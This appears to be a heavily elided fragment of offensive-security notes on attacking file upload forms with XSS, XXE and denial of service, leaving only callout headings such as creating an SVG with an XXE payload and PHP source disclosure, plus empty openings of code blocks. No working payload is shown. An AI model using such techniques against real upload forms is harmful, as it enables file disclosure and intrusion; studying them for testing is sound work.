...
> [!ABSTRACT] Secure Forms: Attacking "secure" upload forms with XSS, XXE, and DoS when arbitrary uploads fail.
...
> [!EXAMPLE] Malicious HTML Example:
```html
<!DOCTYPE html>
<html>
<head>
...
> [!EXAMPLE] Decoding base64 output:
```bash
...
> [!EXAMPLE] Step 1: Create SVG with XXE payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
...
> [!EXAMPLE] Step 1: Create PHP source disclosure SVG
```xml
<?xml version="1.0" encoding="UTF-8"?>
...
> [!EXAMPLE] Step 3: Decode PHP source
```bash
